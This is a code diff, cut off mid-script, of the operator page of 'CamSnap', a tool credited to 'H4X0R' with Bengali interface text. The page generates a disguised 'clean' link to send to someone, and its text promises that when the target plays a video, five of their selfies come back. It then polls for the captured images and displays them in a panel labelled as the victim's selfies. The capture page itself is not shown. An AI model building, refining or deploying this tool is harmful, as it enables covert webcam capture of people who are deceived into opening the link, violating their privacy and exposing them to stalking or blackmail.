@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CamSnap • Instant Selfie Grabber</title>
+  <title>CamSnap • Clean Link Grabber</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
     body{background:#f9f9fb;color:#222;display:flex;flex-direction:column;min-height:100vh;}
@@ -17,7 +17,7 @@
     button:hover{background:#0052cc;}
 
     #linkBox{margin-top:30px;padding:25px;background:#f0f8ff;border:2px dashed #0066ff;border-radius:16px;display:none;}
-    #victimLink{width:100%;padding:18px;margin:15px 0;border:none;border-radius:14px;background:#f0f0f0;font-size:1.1em;font-weight:600;word-break:break-all;}
+    #cleanLink{padding:18px;margin:15px 0;background:#f0f0f0;border-radius:14px;font-size:1.2em;font-weight:600;word-break:break-all;}
     .copy-btn{background:#28a745;padding:14px 30px;border-radius:12px;color:#fff;font-size:1.1em;margin-top:10px;}
 
     .photos-section{margin-top:40px;}
@@ -26,10 +26,10 @@
     #photoScroll::-webkit-scrollbar{display:none;}
     .photo-item img{height:420px;width:auto;border-radius:18px;border:5px solid #0066ff;box-shadow:0 12px 35px rgba(0,102,255,0.4);cursor:pointer;}
     #dots{display:flex;justify-content:center;gap:12px;margin-top:18px;}
-    .dot{width:12px;height:12px;background:#ccc;border-radius:50%;transition:0.3s;}
+    .dot{width:12px;height:12px;background:#ccc;border-radius:50%;}
     .dot.active{background:#0066ff;transform:scale(1.4);}
-    .loading{text-align:center;padding:60px 0;color:#777;font-size:1.1em;}
-    footer{text-align:center;padding:25px;color:#888;font-size:0.95em;background:#fff;border-top:1px solid #eee;}
+    .loading{text-align:center;padding:60px 0;color:#777;}
+    footer{text-align:center;padding:25px;color:#888;background:#fff;border-top:1px solid #eee;}
   </style>
 </head>
 <body>
@@ -41,79 +41,74 @@
 <main>
   <div class="card">
     <h1>CamSnap Pro</h1>
-    <p>নিচের বাটনে চাপো → লিংক বানাও → পাঠাও<br>কেউ প্লে করলেই তার ৫টা সেলফি তোমার কাছে চলে আসবে!</p>
+    <p>বাটনে চাপো → ক্লিন লিংক বানাও → পাঠাও<br>কেউ প্লে করলেই ৫টা সেলফি তোমার কাছে!</p>
 
-    <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
+    <button onclick="generate()">নতুন ক্লিন লিংক বানান</button>
 
     <div id="linkBox">
-      <p style="color:#0066ff;font-weight:600;margin-bottom:15px;">তোমার লিংক রেডি!</p>
-      <div id="victimLink"></div>
-      <button class="copy-btn" onclick="copyLink()">কপি করুন</button>
-      <a href="" id="testLink" target="_blank" style="display:block;margin-top:18px;color:#0066ff;font-weight:600;text-decoration:underline;">মোবাইলে টেস্ট করো</a>
+      <p style="color:#0066ff;font-weight:600;">তোমার ক্লিন লিংক রেডি!</p>
+      <div id="cleanLink"></div>
+      <button class="copy-btn" onclick="copy()">কপি করুন</button>
+      <a href="" id="test" target="_blank" style="display:block;margin-top:18px;color:#0066ff;font-weight:600;text-decoration:underline;">মোবাইলে টেস্ট করো</a>
     </div>
 
     <div class="photos-section">
-      <div class="title">ভিকটিমের সেলফি (অরিজিনাল সাইজ)</div>
-      <div id="photoScroll"><div class="loading">অপেক্ষা করো... প্লে করলে ছবি আসবে</div></div>
-      <div id="dots">
-        <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
-      </div>
+      <div class="title">ভিকটিমের সেলফি (অরিজিনাল)</div>
+      <div id="photoScroll"><div class="loading">প্লে করলে ছবি আসবে...</div></div>
+      <div id="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
     </div>
   </div>
 </main>
 
-<footer>Developed by H4X0R • 100% Working 2025</footer>
+<footer>Developed by H4X0R • Clean URL 2025</footer>
 
 <script>
 let currentId = null;
-const viewUrl = location.href.split('/').slice(0,-1).join('/') + '/view.html';
+const base = location.origin + location.pathname.split('/').slice(0,-1).join('/') + '/';
 
-function generateLink() {
-  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
-  const finalUrl = `${viewUrl}?id=${currentId}`;
+function generate() {
+  currentId = Math.random().toString(36).substr(2, 9);
+  const cleanUrl = base + currentId;
   
   document.getElementById("linkBox").style.display = "block";
-  document.getElementById("victimLink").textContent = finalUrl;
-  document.getElementById("testLink").href = finalUrl;
+  document.getElementById("cleanLink").textContent = cleanUrl;
+  document.getElementById("test").href = cleanUrl;
   
-  document.getElementById("photoScroll").innerHTML = `<div class="loading">ভিডিও প্লে করলে ছবি আসবে...</div>`;
+  document.getElementById("photoScroll").innerHTML = `<div class="loading">অপেক্ষা করো...</div>`;
   resetDots();
-  startChecking();
+  checkPhotos();
 }
 
-function copyLink() {
-  navigator.clipboard.writeText(document.getElementById("victimLink").textContent);
-  alert("লিংক কপি হয়ে গেছে!");
+function copy() {
+  navigator.clipboard.writeText(document.getElementById("cleanLink").textContent);
+  alert("কপি হয়ে গেছে!");
 }
 
 function resetDots() {
   document.querySelectorAll('.dot').forEach(d => { d.classList.remove('active'); d.style.background = '#ccc'; });
 }
 
-function showPhotos(imgs) {
-  const container = document.getElementById('photoScroll');
-  container.innerHTML = '';
-  imgs.forEach(src => {
-    const div = document.createElement('div');
-    div.className = 'photo-item';
-    const img = document.createElement('img');
-    img.src = src;
-    img.onclick = () => window.open(src, '_blank');
-    div.appendChild(img);
-    container.appendChild(div);
-  });
-  document.querySelectorAll('.dot').forEach((dot, i) => {
-    dot.classList.toggle('active', i < imgs.length);
-    dot.style.background = i < imgs.length ? '#0066ff' : '#ccc';
-  });
-}
-
-function startChecking() {
+function checkPhotos() {
   if (!currentId) return;
   const check = () => {
     const data = localStorage.getItem('camsnap_' + currentId);
     if (data) {
-      showPhotos(JSON.parse(data));
+      const imgs = JSON.parse(data);
+      const container = document.getElementById('photoScroll');
+      container.innerHTML = '';
+      imgs.forEach(src => {
+        const div = document.createElement('div');
+        div.className = 'photo-item';
+        const img = document.createElement('img');
+        img.src = src;
+        img.onclick = () => window.open(src, '_blank');
+        div.appendChild(img);
+        container.appendChild(div);
+      });
+      document.querySelectorAll('.dot').forEach((d,i) => {
+        d.classList.toggle('active', i < imgs.length);
+        d.style.background = i < imgs.length ? '#0066ff' : '#ccc';
+      });
       localStorage.removeItem('camsnap_' + currentId);
     }
     setTimeout(check, 2000);
